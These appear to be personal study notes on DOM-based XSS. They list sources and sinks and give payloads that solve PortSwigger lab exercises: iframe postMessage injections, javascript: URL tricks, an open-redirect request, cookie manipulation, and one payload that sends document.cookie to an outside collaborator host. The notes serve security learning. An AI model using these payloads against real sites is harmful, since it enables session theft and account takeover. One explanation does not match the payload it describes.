

The DOM is an internal data structure that stores all of the objects and properties of a web page

The Document Object Model is what makes dynamic, single-page applications possible
an XSS attack wherein the attack payload is executed as a result of modifying the DOM
the page itself (the HTTP response that is) does not change, but the client side code contained in the page executes differently due to the malicious modifications that have occurred in the DOM environment.

so when we do a request with a specific sink like `?default=<script>..`

the response would be js and when this js is recieved it will take that param and execute it on the client side 


- **Sources** are inputs that can be manipulated by attackers, including URLs, cookies, and web messages.
    
- **Sinks** are potentially dangerous endpoints where malicious data can lead to adverse effects, such as script execution.

common **sources** :
`document.URL document.documentURI document.URLUnencoded document.baseURI location document.cookie document.referrer window.name history.pushState history.replaceState localStorage sessionStorage IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB) Database`




common **sink**: 

|[DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) LABS|`document.write()`|
|[Open redirection](https://portswigger.net/web-security/dom-based/open-redirection) LABS|`window.location`|
|[Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation) LABS|`document.cookie`|
|[JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)|`eval()`|
|[Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)|`document.domain`|
|[WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)|`WebSocket()`|
|[Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)|`element.src`|
|[Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)|`postMessage()`|
|[Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)|`setRequestHeader()`|
|[Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)|`FileReader.readAsText()`|
|[Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)|`ExecuteSql()`|
|[HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)|`sessionStorage.setItem()`|
|[Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)|`document.evaluate()`|
|[Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)|`JSON.parse()`|
|[DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)|`element.setAttribute()`|
|[Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)|`RegExp()`|

#### Dom Invader

 Using Dom Invader plug-in and set the canary to value, such as `domxss`, it will detect DOM-XSS sinks that can be exploit.
 
#### Injection point 
`<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer`

# LAB
### DOM XSS using web messages

 Notice that the home page contains an addEventListener() call that listens for a web message

```html
<iframe src="https://0a2400760421f3368091f379005c00c3.web-security-academy.net/" onload="this.contentWindow.postMessage('<svg><animate onbegin=print() attributeName=x dur=1s>','*')">
```

When the iframe loads, the postMessage() method sends a web message to the home page. The event listener, which is intended to serve ads, takes the content of the web message and inserts it into the div with the ID ads. However, in this case it inserts our img tag, which contains an invalid src attribute. This throws an error, which causes the onerror event handler to execute our payload.

###  DOM XSS using web messages and a JavaScript URL


i found this in the home page source code

```js
                   <script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    </script>
```

open the console and check for poc
```js
window.postMessage('javascript:alert(1)//http:', 'https://0a4700f1042e7de484a84021003a00ec.web-security-academy.net/');
```

```html 
<iframe src="https://0a080004042390a58102bba100a5000a.web-security-academy.net//" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">

OR 


<iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('javascript:document.location=`https://OASTIFY.COM?c=`+document.cookie','*')">
```
//is for commenting the rest of the code

Without `//`, the browser expects a valid JavaScript expression following `print()`, but `http:` isn't valid JavaScript. As a result, the browser throws an error or fails to execute properly because `http:` is not valid JavaScript syntax.



#### DOM XSS using web messages and `JSON.parse`
```html

<iframe src="https://0a6300dd04e0bb0a800eb73700750017.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>

```

####  DOM-based open redirection

in the js file i found:
``` html
<a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>**
```

you can see the sink **location.href**  and it is being called by `returnURL` = `/url`


```HTML
GET /post?postId=5&url=https://exploit-0a92006f0414f31e80cfbb9e01b5003d.exploit-server.net/exploit 
```


#### DOM-based cookie manipulation

if JavaScript writes data from a source into `document.cookie` without sanitizing it first, an attacker can manipulate the value of a single cookie to inject arbitrary values:


```html
                       <script>
                            document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
                        </script>
                        <div class="is-linkback">
                            <a href="/">Return to list</a>
                        </div>
                        
```

exploit

```html

`<iframe src="https://web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://web-security-academy.net';window.x=1;">`

```


#### DOM XSS using web messages and JSON.parse


```html
<iframe src="https://0a03009c03110946c0d1aea2003700e0.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```